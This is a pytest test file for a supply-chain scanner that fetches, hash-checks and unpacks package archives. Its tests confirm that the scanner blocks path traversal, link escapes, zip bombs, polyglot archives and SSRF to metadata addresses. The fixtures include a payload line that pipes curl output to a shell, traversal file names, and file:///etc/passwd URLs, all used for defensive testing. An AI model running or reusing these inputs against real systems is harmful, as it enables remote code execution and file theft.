from __future__ import annotations

import base64
import hashlib
import io
import json
import socket
import tarfile
import urllib.error
import warnings
import zipfile
from pathlib import Path

import pytest
from click.testing import CliRunner

from ca9.artifacts import fetch, unpack
from ca9.artifacts.fetch import (
    ArtifactScanConfig,
    _BlockedRedirect,
    _URLPolicy,
    _ValidatedRedirectHandler,
    _verify_hash,
    _vetted_addresses,
    collect_artifact_snapshots,
)
from ca9.artifacts.unpack import UnpackConfig, unpack_artifact
from ca9.cli import main
from ca9.core.models import Artifact, Inventory, Package, SourceEvidence

NPM_URL = "https://registry.npmjs.org/sample/-/sample-1.0.0.tgz"


def test_collect_artifact_snapshots_extracts_wheel(tmp_path):
    wheel = tmp_path / "benign-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("benign/__init__.py", "VALUE = 1\n")

    inventory = _inventory_for_artifact(wheel)

    result = collect_artifact_snapshots(inventory, _local_config(tmp_path))

    assert result.scanned_artifacts == 1
    assert result.skipped_artifacts == 0
    assert not result.findings
    assert result.snapshots[0].files[0].relative_path == "benign/__init__.py"


def test_collect_artifact_snapshots_extracts_sdist_tarball(tmp_path):
    sdist = tmp_path / "benign-1.0.0.tar.gz"
    with tarfile.open(sdist, "w:gz") as tf:
        payload = b"VALUE = 1\n"
        info = tarfile.TarInfo("benign-1.0.0/benign/__init__.py")
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))

    inventory = _inventory_for_artifact(sdist, kind="sdist")

    result = collect_artifact_snapshots(inventory, _local_config(tmp_path))

    assert result.scanned_artifacts == 1
    assert not result.findings
    assert result.snapshots[0].files[0].relative_path == "benign-1.0.0/benign/__init__.py"


def test_collect_artifact_snapshots_rejects_zip_path_traversal(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("../evil.py", "print('nope')\n")

    inventory = _inventory_for_artifact(wheel, package_name="bad")

    result = collect_artifact_snapshots(inventory, _local_config(tmp_path))

    assert result.scanned_artifacts == 0
    assert result.skipped_artifacts == 1
    assert result.findings[0].signal_type == "artifact_unpack_error"
    assert result.findings[0].metadata["action"] == "block"


def test_collect_artifact_snapshots_blocks_hash_mismatch(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("bad/__init__.py", "VALUE = 1\n")

    inventory = _inventory_for_artifact(wheel, package_name="bad", artifact_hash="sha256:deadbeef")

    result = collect_artifact_snapshots(inventory, _local_config(tmp_path))

    assert result.scanned_artifacts == 0
    assert result.findings[0].signal_type == "artifact_hash_mismatch"
    assert result.findings[0].metadata["action"] == "block"


def test_collect_artifact_snapshots_refuses_unhashed_artifact_by_default(tmp_path):
    wheel = tmp_path / "bad-1.0.0-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("bad/__init__.py", "VALUE = 1\n")

    inventory = _inventory_for_artifact(wheel, package_name="bad", artifact_hash=None)

    result = collect_artifact_snapshots(inventory, _local_config(tmp_path))

    assert result.scanned_artifacts == 0
    assert result.skipped_artifacts == 1
    assert "has no hash" in result.warnings[0]


def test_collect_artifact_snapshots_rejects_special_local_files(tmp_path):
    device = Path("/dev/zero")
    if not device.exists():
        pytest.skip("requires a Unix special file fixture")
    inventory = _inventory_for_artifact(
        device,
        package_name="special-file",
        artifact_hash=None,
    )

    result = collect_artifact_snapshots(
        inventory,
        ArtifactScanConfig(
            cache_dir=tmp_path / "cache",
            allow_unhashed_downloads=True,
            allowed_local_roots=(device.parent,),
        ),
    )

    assert result.scanned_artifacts == 0
    assert result.skipped_artifacts == 1
    assert result.findings[0].signal_type == "artifact_fetch_error"
    assert "not a regular file" in result.findings[0].metadata["reason"]


def test_collect_artifact_snapshots_enforces_local_artifact_roots(tmp_path):
    wheel = tmp_path / "outside.whl"
    with zipfile.ZipFile(wheel, "w") as zf:
        zf.writestr("package.py", "VALUE = 1\n")
    allowed = tmp_path / "allowed"
    allowed.mkdir()

    result = collect_artifact_snapshots(
        _inventory_for_artifact(wheel),
        ArtifactScanConfig(
            cache_dir=tmp_path / "cache",
            allowed_local_roots=(allowed,),
        ),
    )

    assert result.scanned_artifacts == 0
    assert result.findings[0].signal_type == "artifact_untrusted_url"
    assert "outside the allowed roots" in result.findings[0].metadata["reason"]


def test_unpack_path_collision_is_a_block_finding(tmp_path):
    archive = tmp_path / "collision.tar.gz"
    with tarfile.open(archive, "w:gz") as tf:
        payload = b"file first"
        file_info = tarfile.TarInfo("collision")
        file_info.size = len(payload)
        tf.addfile(file_info, io.BytesIO(payload))
        directory_info = tarfile.TarInfo("collision")
        directory_info.type = tarfile.DIRTYPE
        tf.addfile(directory_info)

    result = collect_artifact_snapshots(
        _inventory_for_artifact(archive, kind="sdist"),
        _local_config(tmp_path),
    )

    assert result.scanned_artifacts == 0
    assert result.findings[0].signal_type == "artifact_unpack_error"
    assert result.findings[0].metadata["action"] == "block"


def test_redirect_handler_checks_destination_before_following():
    handler = _ValidatedRedirectHandler(lambda _url: False)

    with pytest.raises(urllib.error.URLError, match="redirect blocked"):
        handler.redirect_request(None, None, 302, "Found", {}, "https://blocked.example/x")


# Parser differential: the container comes from the artifact kind, never from sniffing.


@pytest.mark.parametrize(
    ("kind", "filename"),
    [
        ("npm-tarball", "poly-1.0.0.tgz"),
        ("sdist", "poly-1.0.0.tar.gz"),
        ("wheel", "poly-1.0.0-py3-none-any.whl"),
    ],
)
def test_archive_that_parses_as_tar_and_zip_is_blocked(tmp_path, kind, filename):
    malicious = _tgz_bytes({"package/index.js": b"require('child_process').exec('curl evil|sh')"})
    benign = _zip_bytes({"package/index.js": b"module.exports = 1;\n"})
    archive = tmp_path / filename
    archive.write_bytes(malicious + benign)

    result = collect_artifact_snapshots(
        _inventory_for_artifact(archive, kind=kind, artifact_hash=_sri(archive.read_bytes())),
        _local_config(tmp_path),
    )

    assert not result.snapshots
    assert [finding.signal_type for finding in result.findings] == ["artifact_ambiguous_archive"]
    assert result.findings[0].metadata["action"] == "block"
    assert "also parses as" in result.findings[0].metadata["reason"]


def test_npm_tarball_is_never_unpacked_as_zip(tmp_path):
    archive = tmp_path / "sample-1.0.0.tgz"
    archive.write_bytes(_zip_bytes({"package/index.js": b"module.exports = 1;\n"}))

    result = collect_artifact_snapshots(
        _inventory_for_artifact(archive, kind="npm-tarball"),
        _local_config(tmp_path),
    )

    assert not result.snapshots
    assert result.findings[0].signal_type == "artifact_unpack_error"


def test_stray_zip_signature_in_tarball_is_not_a_zip_directory():
    tgz = _tgz_bytes({"package/index.js": b"module.exports = 1;\n"})
    fake_end_record = (
        b"PK\x05\x06" + bytes(4) + (1).to_bytes(2, "little") * 2 + (40).to_bytes(4, "little")
    ) + bytes(6)

    assert unpack._zip_directory(io.BytesIO(tgz + fake_end_record)) is None
    assert unpack._zip_directory(io.BytesIO(_zip_bytes({"a.txt": b"a"}))) == (1, 51)


# Resource limits: every member counts, iteration is lazy, expansion is bounded.


def test_tar_directory_entries_count_toward_entry_limit(tmp_path):
    archive = _write(tmp_path / "dirs.tgz", _tgz_bytes({}, directories=50))

    with pytest.raises(ValueError, match="too many entries"):
        _unpack(tmp_path, archive, "npm-tarball", UnpackConfig(max_files=10, max_total_bytes=10**6))


def test_tar_is_iterated_without_loading_every_member(tmp_path, monkeypatch):
    def fail(*_args, **_kwargs):
        raise AssertionError("getmembers() decompresses and indexes the whole archive")

    monkeypatch.setattr(tarfile.TarFile, "getmembers", fail)
    archive = _write(tmp_path / "ok.tgz", _tgz_bytes({"package/index.js": b"1"}))

    snapshot = _unpack(tmp_path, archive, "npm-tarball", UnpackConfig(10, 10**6))

    assert [item.relative_path for item in snapshot.files] == ["package/index.js"]


def test_tar_members_of_any_type_count_toward_size_limit(tmp_path):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w:gz") as tf:
        info = tarfile.TarInfo("package/blob")
        info.type = b"Z"  # unknown types are skipped by extractors but still decompressed
        info.size = 64 * 1024
        tf.addfile(info, io.BytesIO(bytes(info.size)))
    archive = _write(tmp_path / "skipped.tgz", stream.getvalue())

    with pytest.raises(ValueError, match="expands too large"):
        _unpack(tmp_path, archive, "npm-tarball", UnpackConfig(10, 1000))


def test_tar_header_records_cannot_expand_past_the_stream_bound(tmp_path):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w:gz", format=tarfile.PAX_FORMAT) as tf:
        info = tarfile.TarInfo("package/index.js")
        info.pax_headers = {"comment": "x" * (2 * 1024 * 1024)}
        tf.addfile(info, io.BytesIO())
    archive = _write(tmp_path / "pax.tgz", stream.getvalue())

    with pytest.raises(ValueError, match="expands too large"):
        _unpack(tmp_path, archive, "npm-tarball", UnpackConfig(10, 1000))


@pytest.mark.parametrize(
    ("name", "kind", "linkname"),
    [
        ("/etc/evil", tarfile.REGTYPE, ""),
        ("package/../../evil", tarfile.REGTYPE, ""),
        ("package/link", tarfile.SYMTYPE, "/etc/passwd"),
        ("package/link", tarfile.SYMTYPE, "../../outside"),
        ("package/hard", tarfile.LNKTYPE, "/etc/passwd"),
    ],
)
def test_tar_paths_and_links_cannot_escape_the_extraction_root(tmp_path, name, kind, linkname):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w:gz") as tf:
        info = tarfile.TarInfo(name)
        info.type = kind
        info.linkname = linkname
        tf.addfile(info, io.BytesIO())
    archive = _write(tmp_path / "escape.tgz", stream.getvalue())

    with pytest.raises(ValueError, match="absolute path|path traversal|unsafe link"):
        _unpack(tmp_path, archive, "npm-tarball", UnpackConfig(10, 10**6))
    assert not (tmp_path / "evil").exists()
    assert not (tmp_path / "out").exists()


def test_zip_directory_entries_count_toward_entry_limit(tmp_path):
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w") as zf:
        for index in range(20):
            zf.writestr(zipfile.ZipInfo(f"dir{index}/"), b"")
        zf.writestr("pkg/__init__.py", b"")
    archive = _write(tmp_path / "dirs-1.0.0-py3-none-any.whl", stream.getvalue())

    with pytest.raises(ValueError, match="too many entries"):
        _unpack(tmp_path, archive, "wheel", UnpackConfig(max_files=10, max_total_bytes=10**6))


def test_zip_expansion_ratio_is_capped(tmp_path, monkeypatch):
    monkeypatch.setattr(unpack, "_EXPANSION_RATIO_FLOOR", 1024)
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("pkg/data.bin", bytes(512 * 1024))
    archive = _write(tmp_path / "bomb-1.0.0-py3-none-any.whl", stream.getvalue())

    with pytest.raises(ValueError, match="200x"):
        _unpack(tmp_path, archive, "wheel", UnpackConfig(10, 10**7))


def test_zip_duplicate_entries_are_rejected(tmp_path):
    stream = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        with zipfile.ZipFile(stream, "w") as zf:
            zf.writestr("pkg/__init__.py", b"benign")
            zf.writestr("pkg/__init__.py", b"malicious")
    archive = _write(tmp_path / "dup-1.0.0-py3-none-any.whl", stream.getvalue())

    with pytest.raises(ValueError, match="duplicate entry"):
        _unpack(tmp_path, archive, "wheel", UnpackConfig(10, 10**6))


def test_reunpacking_replaces_previous_tree(tmp_path):
    first = _write(tmp_path / "a.tgz", _tgz_bytes({"package/old.js": b"1"}))
    second = _write(tmp_path / "b.tgz", _tgz_bytes({"package/new.js": b"2"}))

    _unpack(tmp_path, first, "npm-tarball", UnpackConfig(10, 10**6))
    snapshot = _unpack(tmp_path, second, "npm-tarball", UnpackConfig(10, 10**6))

    assert sorted(path.name for path in (tmp_path / "out" / "package").iterdir()) == ["new.js"]
    assert snapshot.files[0].path.read_bytes() == b"2"
    assert sorted(path.name for path in tmp_path.iterdir() if path.name.startswith(".")) == []


# Cache: verified bytes are published atomically and corrupt entries are refetched.


def test_truncated_cache_entry_is_refetched(tmp_path):
    archive = _write(tmp_path / "sample-1.0.0.tgz", _tgz_bytes({"package/index.js": b"1"}))
    inventory = _inventory_for_artifact(archive, kind="npm-tarball")
    assert collect_artifact_snapshots(inventory, _local_config(tmp_path)).scanned_artifacts == 1
    cached = next((tmp_path / "cache" / "downloads").iterdir())
    cached.write_bytes(cached.read_bytes()[:10])

    result = collect_artifact_snapshots(inventory, _local_config(tmp_path))

    assert result.scanned_artifacts == 1
    assert not result.findings
    assert cached.read_bytes() == archive.read_bytes()


def test_interrupted_download_leaves_no_cache_entry(tmp_path, monkeypatch):
    data = _tgz_bytes({"package/index.js": b"1"})
    downloads = tmp_path / "cache" / "downloads"

    def interrupted(url, destination, max_bytes, url_validator):
        assert destination.parent == downloads
        assert not [path for path in downloads.iterdir() if not path.name.endswith(".part")]
        destination.write_bytes(data[:20])
        raise KeyboardInterrupt

    monkeypatch.setattr(fetch, "_download_artifact", interrupted)
    with pytest.raises(KeyboardInterrupt):
        collect_artifact_snapshots(_remote_inventory(NPM_URL, _sri(data)), _cache_config(tmp_path))

    assert list(downloads.iterdir()) == []


def test_download_failing_verification_is_not_cached(tmp_path, monkeypatch):
    good = _tgz_bytes({"package/index.js": b"1"})
    served = [b"tampered or truncated", good]
    monkeypatch.setattr(
        fetch,
        "_download_artifact",
        lambda url, destination, max_bytes, url_validator: destination.write_bytes(served.pop(0)),
    )
    inventory = _remote_inventory(NPM_URL, _sri(good))

    first = collect_artifact_snapshots(inventory, _cache_config(tmp_path))
    second = collect_artifact_snapshots(inventory, _cache_config(tmp_path))

    assert [finding.signal_type for finding in first.findings] == ["artifact_hash_mismatch"]
    assert first.findings[0].metadata["action"] == "block"
    assert second.scanned_artifacts == 1
    assert not second.findings


# Integrity: strongest listed digest wins; SHA-1 verifies but is weak evidence.


def test_verify_hash_supports_sha1_sri(tmp_path):
    blob = _write(tmp_path / "blob", b"hello")

    assert _verify_hash(blob, _sri(b"hello", "sha1"))[0] is True
    assert _verify_hash(blob, _sri(b"other", "sha1"))[0] is False


def test_sha1_only_integrity_is_warned_not_blocked(tmp_path, monkeypatch):
    data = _tgz_bytes({"package/index.js": b"1"})
    _serve(monkeypatch, data)

    result = collect_artifact_snapshots(
        _remote_inventory(NPM_URL, _sri(data, "sha1")), _cache_config(tmp_path)
    )

    assert result.scanned_artifacts == 1
    assert [finding.signal_type for finding in result.findings] == ["artifact_weak_integrity"]
    assert result.findings[0].metadata["action"] == "warn"
    assert result.findings[0].severity == "low"


def test_sha1_mismatch_still_blocks(tmp_path, monkeypatch):
    data = _tgz_bytes({"package/index.js": b"1"})
    _serve(monkeypatch, data)

    result = collect_artifact_snapshots(
        _remote_inventory(NPM_URL, _sri(b"something else", "sha1")), _cache_config(tmp_path)
    )

    assert not result.snapshots
    assert [finding.signal_type for finding in result.findings] == ["artifact_hash_mismatch"]
    assert result.findings[0].metadata["action"] == "block"


@pytest.mark.parametrize(
    ("integrity", "expected"),
    [
        ("{sha1_good} {sha512_bad}", ["artifact_hash_mismatch"]),
        ("{sha1_bad} {sha512_good}", []),
        ("{sha256_good} {sha1_bad}", []),
    ],
)
def test_strongest_listed_digest_decides(tmp_path, monkeypatch, integrity, expected):
    data = _tgz_bytes({"package/index.js": b"1"})
    _serve(monkeypatch, data)
    values = {
        "sha1_good": _sri(data, "sha1"),
        "sha1_bad": _sri(b"x", "sha1"),
        "sha256_good": _sri(data, "sha256"),
        "sha512_good": _sri(data),
        "sha512_bad": _sri(b"x"),
    }

    result = collect_artifact_snapshots(
        _remote_inventory(NPM_URL, integrity.format(**values)), _cache_config(tmp_path)
    )

    assert [finding.signal_type for finding in result.findings] == expected


def test_unsupported_hash_format_fails_without_downloading(tmp_path, monkeypatch):
    monkeypatch.setattr(fetch, "_download_artifact", _fail_download)

    result = collect_artifact_snapshots(
        _remote_inventory(NPM_URL, "crc32:abcd1234"), _cache_config(tmp_path)
    )

    assert [finding.signal_type for finding in result.findings] == ["artifact_hash_mismatch"]
    assert "unsupported artifact hash format" in result.findings[0].metadata["reason"]


# URL policy: lockfile URLs never reach local files, plain HTTP or internal addresses.


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "/etc/passwd",
        "http://registry.npmjs.org/sample/-/sample-1.0.0.tgz",
        "ftp://registry.npmjs.org/sample-1.0.0.tgz",
        "https://169.254.169.254/latest/meta-data/",
        "https://127.0.0.1/sample-1.0.0.tgz",
        "https://[::1]/sample-1.0.0.tgz",
        "https://10.0.0.5/sample-1.0.0.tgz",
        "https://evil.example/sample-1.0.0.tgz",
        "https://registry.npmjs.org.evil.example/sample-1.0.0.tgz",
        "https://user:secret@registry.npmjs.org/sample-1.0.0.tgz",
        "https://registry.npmjs.org\\@evil.example/sample-1.0.0.tgz",
    ],
)
def test_untrusted_lockfile_urls_are_not_fetched(tmp_path, monkeypatch, url):
    _forbid_network(monkeypatch)
    monkeypatch.setattr(fetch, "_download_artifact", _fail_download)

    result = collect_artifact_snapshots(
        _remote_inventory(url, "sha256:" + "0" * 64), _cache_config(tmp_path)
    )

    assert not result.snapshots
    assert result.skipped_artifacts == 1
    assert [finding.signal_type for finding in result.findings] == ["artifact_untrusted_url"]
    assert result.findings[0].metadata["reason"].startswith("not fetched (untrusted URL)")
    assert not (tmp_path / "cache" / "downloads").exists()


def test_configured_indexes_are_fetched(tmp_path, monkeypatch):
    data = _tgz_bytes({"package/index.js": b"1"})
    fetched = _serve(monkeypatch, data)
    url = "https://npm.mirror.example:8443/sample/-/sample-1.0.0.tgz"

    untrusted = collect_artifact_snapshots(
        _remote_inventory(url, _sri(data)), _cache_config(tmp_path)
    )
    trusted = collect_artifact_snapshots(
        _remote_inventory(url, _sri(data)),
        _cache_config(tmp_path, trusted_indexes=("https://npm.mirror.example:8443/npm",)),
    )

    assert untrusted.findings[0].signal_type == "artifact_untrusted_url"
    assert trusted.scanned_artifacts == 1
    assert fetched == [url]


def test_host_resolving_to_internal_address_is_refused(tmp_path, monkeypatch):
    _forbid_network(monkeypatch)
    for name in ("HTTPS_PROXY", "https_proxy", "ALL_PROXY", "all_proxy"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setattr(socket, "getaddrinfo", _resolve_to("169.254.169.254"))

    result = collect_artifact_snapshots(
        _remote_inventory(NPM_URL, "sha256:" + "0" * 64), _cache_config(tmp_path)
    )

    assert [finding.signal_type for finding in result.findings] == ["artifact_untrusted_url"]
    assert "non-public address 169.254.169.254" in result.findings[0].metadata["reason"]


def test_private_indexes_may_resolve_to_internal_addresses(monkeypatch):
    monkeypatch.setattr(socket, "getaddrinfo", _resolve_to("10.0.0.5"))
    private = frozenset({("npm.corp.example", 443)})

    assert _vetted_addresses("npm.corp.example", 443, private) == ["10.0.0.5"]
    with pytest.raises(ValueError, match="non-public address"):
        _vetted_addresses("npm.corp.example", 443, frozenset())


@pytest.mark.parametrize(
    "target",
    [
        "http://registry.npmjs.org/sample-1.0.0.tgz",
        "https://169.254.169.254/latest/meta-data/",
        "https://evil.example/sample-1.0.0.tgz",
        "file:///etc/passwd",
    ],
)
def test_every_redirect_hop_is_checked_by_the_url_policy(target):
    policy = _URLPolicy.from_config(ArtifactScanConfig())
    handler = _ValidatedRedirectHandler(policy)

    with pytest.raises(urllib.error.URLError, match="redirect blocked"):
        handler.redirect_request(None, None, 302, "Found", {}, target)


def test_blocked_redirect_is_reported_as_untrusted_url(tmp_path, monkeypatch):
    class Opener:
        def open(self, *_args, **_kwargs):
            raise _BlockedRedirect("artifact redirect blocked by URL policy: https://evil.example/")

    monkeypatch.setattr(_URLPolicy, "opener", lambda _self: Opener())

    result = collect_artifact_snapshots(
        _remote_inventory(NPM_URL, "sha256:" + "0" * 64), _cache_config(tmp_path)
    )

    assert [finding.signal_type for finding in result.findings] == ["artifact_untrusted_url"]
    assert "evil.example" in result.findings[0].metadata["reason"]


def test_untrusted_url_escape_hatch_is_an_explicit_parameter(tmp_path, monkeypatch):
    data = _tgz_bytes({"package/index.js": b"1"})
    url = "http://127.0.0.1:8080/sample-1.0.0.tgz"
    fetched = _serve(monkeypatch, data)

    result = collect_artifact_snapshots(
        _remote_inventory(url, _sri(data)),
        _cache_config(tmp_path, allow_untrusted_urls=True),
    )

    assert result.scanned_artifacts == 1
    assert fetched == [url]


def test_vet_does_not_read_local_artifacts_without_an_explicit_root(tmp_path):
    artifact = _write(
        tmp_path / "badlib-1.0.0-py3-none-any.whl", _zip_bytes({"badlib.pth": b"import os\n"})
    )
    repo = tmp_path / "repo"
    repo.mkdir()
    digest = hashlib.sha256(artifact.read_bytes()).hexdigest()
    (repo / "fyn.lock").write_text(
        f"""
version = 1

[[package]]
name = "demo"
version = "0.1.0"
source = {{ editable = "." }}
dependencies = [{{ name = "badlib" }}]

[[package]]
name = "badlib"
version = "1.0.0"
source = {{ registry = "https://pypi.org/simple" }}
wheels = [
  {{ url = "{artifact.as_uri()}", hash = "sha256:{digest}", size = 42 }},
]
"""
    )

    result = CliRunner().invoke(
        main, ["vet", "--repo", str(repo), "-f", "json", "--scan-artifacts"]
    )

    data = json.loads(result.output)
    assert data["summary"]["artifact_scans"] == 0
    signals = [finding["signal_type"] for finding in data["findings"]]
    assert "artifact_untrusted_url" in signals
    assert "python-startup-pth-exec" not in signals


def _local_config(tmp_path, **overrides) -> ArtifactScanConfig:
    return ArtifactScanConfig(
        cache_dir=tmp_path / "cache", allowed_local_roots=(tmp_path,), **overrides
    )


def _cache_config(tmp_path, **overrides) -> ArtifactScanConfig:
    return ArtifactScanConfig(cache_dir=tmp_path / "cache", **overrides)


def _unpack(tmp_path, archive: Path, kind: str, config: UnpackConfig):
    artifact = Artifact(kind=kind, url=archive.as_uri())
    package = Package(name="sample", version="1.0.0")
    return unpack_artifact(package, artifact, archive, tmp_path / "out", config)


def _serve(monkeypatch, data: bytes) -> list[str]:
    fetched: list[str] = []

    def download(url, destination, max_bytes, url_validator):
        assert url_validator(url)
        fetched.append(url)
        destination.write_bytes(data)

    monkeypatch.setattr(fetch, "_download_artifact", download)
    return fetched


def _fail_download(*_args):
    raise AssertionError("untrusted artifact URL was requested")


def _forbid_network(monkeypatch) -> None:
    def refuse(*_args, **_kwargs):
        raise AssertionError("network access attempted")

    monkeypatch.setattr(socket, "create_connection", refuse)


def _resolve_to(address: str):
    def resolve(host, port, *_args, **_kwargs):
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (address, port))]

    return resolve


def _write(path: Path, data: bytes) -> Path:
    path.write_bytes(data)
    return path


def _tgz_bytes(files: dict[str, bytes], *, directories: int = 0) -> bytes:
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w:gz") as tf:
        for index in range(directories):
            info = tarfile.TarInfo(f"d{index}")
            info.type = tarfile.DIRTYPE
            tf.addfile(info)
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return stream.getvalue()


def _zip_bytes(files: dict[str, bytes]) -> bytes:
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return stream.getvalue()


def _sri(data: bytes, algorithm: str = "sha512") -> str:
    return f"{algorithm}-" + base64.b64encode(hashlib.new(algorithm, data).digest()).decode()


def _remote_inventory(url: str, artifact_hash: str | None, kind: str = "npm-tarball") -> Inventory:
    evidence = SourceEvidence(source="test", path="package-lock.json", reader="test")
    package = Package(
        name="sample",
        version="1.0.0",
        dependency_kind="direct",
        artifacts=(Artifact(kind=kind, url=url, hash=artifact_hash, evidence=(evidence,)),),
        evidence=(evidence,),
    )
    return Inventory(repo_path=".", packages=(package,))


def _inventory_for_artifact(
    path,
    *,
    package_name: str = "benign",
    kind: str = "wheel",
    artifact_hash: str | None = "auto",
) -> Inventory:
    if artifact_hash == "auto":
        artifact_hash = f"sha256:{_sha256(path)}"
    evidence = SourceEvidence(source="test", path=str(path), reader="test")
    package = Package(
        name=package_name,
        version="1.0.0",
        dependency_kind="direct",
        artifacts=(
            Artifact(
                kind=kind,
                url=path.as_uri(),
                hash=artifact_hash,
                evidence=(evidence,),
            ),
        ),
        evidence=(evidence,),
    )
    return Inventory(repo_path=str(path.parent), packages=(package,))


def _sha256(path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()
